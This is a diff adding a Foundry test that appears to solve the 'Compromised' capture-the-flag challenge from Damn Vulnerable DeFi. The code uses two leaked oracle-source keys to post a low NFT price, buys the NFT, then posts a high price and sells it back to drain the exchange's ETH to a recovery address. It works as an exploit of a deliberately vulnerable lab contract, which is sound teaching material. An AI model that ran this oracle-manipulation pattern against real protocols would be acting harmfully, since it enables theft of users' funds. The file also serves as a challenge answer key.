@@ -75,7 +75,54 @@ contract CompromisedChallenge is Test {
      * CODE YOUR SOLUTION HERE
      */
     function test_compromised() public checkSolved {
-        
+
+        // 1. Manipulate oracle prices with the found private keys to be 0
+        uint256 medianPriceBefore = oracle.getMedianPrice("DVNFT");
+        console.log("Median price before: ", medianPriceBefore);
+        vm.startBroadcast(0x188Ea627E3531Db590e6f1D71ED83628d1933088);
+        oracle.postPrice("DVNFT", 0.1 ether);
+        vm.stopBroadcast();
+        vm.startBroadcast(0xA417D473c40a4d42BAd35f147c21eEa7973539D8);
+        oracle.postPrice("DVNFT", 0.1 ether);
+        vm.stopBroadcast();
+        uint256 medianPriceAfter = oracle.getMedianPrice("DVNFT");
+        console.log("Median price after: ", medianPriceAfter);
+
+        // 2. Buy NFT for cheap
+        vm.prank(player);
+        uint256 tokenId = exchange.buyOne{value: 0.1 ether}();
+        console.log("Token ID: ", tokenId);
+
+        console.log("Exchange balance: ", address(exchange).balance);
+
+        // 3. Manipulate oracle prices again to be high
+        vm.startBroadcast(0x188Ea627E3531Db590e6f1D71ED83628d1933088);
+        oracle.postPrice("DVNFT", 999.1 ether);
+        vm.stopBroadcast();
+        vm.startBroadcast(0xA417D473c40a4d42BAd35f147c21eEa7973539D8);
+        oracle.postPrice("DVNFT", 999.1 ether);
+        vm.stopBroadcast();
+
+        // 4. Sell NFT for high price
+        vm.startPrank(player);
+        nft.approve(address(exchange), tokenId);
+        exchange.sellOne(tokenId);
+        vm.stopPrank();
+
+        // 5. Deposite ETH to recovery account
+
+        vm.prank(player);
+        (bool success, ) = payable(recovery).call{value: EXCHANGE_INITIAL_ETH_BALANCE}("");
+        require(success, "Transfer failed.");
+
+        // 6. Manipulate oracles prices to initial prices
+
+        vm.startBroadcast(0x188Ea627E3531Db590e6f1D71ED83628d1933088);
+        oracle.postPrice("DVNFT", 999 ether);
+        vm.stopBroadcast();
+        vm.startBroadcast(0xA417D473c40a4d42BAd35f147c21eEa7973539D8);
+        oracle.postPrice("DVNFT", 999 ether);
+        vm.stopBroadcast();
     }
 
     /**
